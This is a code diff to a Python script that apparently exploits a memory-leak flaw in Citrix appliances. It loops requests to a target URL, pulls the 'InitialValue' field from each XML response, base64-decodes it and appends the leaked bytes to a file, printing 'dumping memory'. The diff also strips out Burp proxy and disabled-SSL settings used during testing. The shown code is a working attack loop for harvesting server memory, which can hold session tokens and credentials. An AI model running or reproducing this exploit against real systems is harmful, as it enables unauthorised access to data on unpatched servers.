@@ -11,32 +11,28 @@ import os
 
 load_dotenv()
 
-proxies = ["http", "127.0.0.1:8080"] # Development testing requests with burp
-
 
 async def main():
     domain = os.getenv("TARGET_URL")
-    connector = aiohttp.TCPConnector(ssl=False) # Remove after devtesting
-    async with aiohttp.ClientSession(connector=connector) as session:
+    async with aiohttp.ClientSession() as session:
         citrix = CitrixConnection(domain, session)
+        print('dumping memory')
 
-        try:
-            with open("output\output.txt", "w") as file:
-                while True:
-                    response_body = citrix.target(proxy=proxies)
+        with open("output\\output.txt", "ab") as file:
+            while True:
+                try:
+                
+                    response_body = await citrix.target()
 
-                    soup = BeautifulSoup(response_body, "html.parser")
+                    soup = BeautifulSoup(response_body, "lxml-xml")
                     initial_values = soup.find("InitialValue")
 
                     value = initial_values.text if initial_values else None
-                    decoded_str = base64.b64decode(value).decode("utf-8")
-                    decoded_hex = bytes.fromhex(decoded_str).decode('utf-8')
-                    file.write(decoded_hex)
-
+                    decoded_bytes = base64.b64decode(value)
+                    file.write(decoded_bytes)
                 
-                
-        except KeyboardInterrupt:
-            print("Keyboard interrupt recieved, terminating program")
+                except KeyboardInterrupt:
+                    print("Keyboard interrupt recieved, terminating program")
 
 
 if __name__ == "__main__":
